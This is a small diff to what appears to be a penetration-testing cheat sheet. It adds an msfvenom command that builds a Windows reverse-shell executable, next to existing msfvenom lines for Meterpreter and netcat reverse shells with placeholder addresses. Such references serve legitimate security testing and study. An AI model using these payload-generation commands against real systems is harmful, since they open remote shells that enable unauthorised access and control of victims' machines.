@@ -16,6 +16,8 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=YOURIP LPORT=YOURPORT -e x
 
 Creating a reverse tcp netcat comamnd
 msfvenom -p cmd/unix/reverse_netcat lhost=<IP> lport=<port> R
+
+msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > revshell.exe
 ```
 
 ### [Unique Reverse TCP]
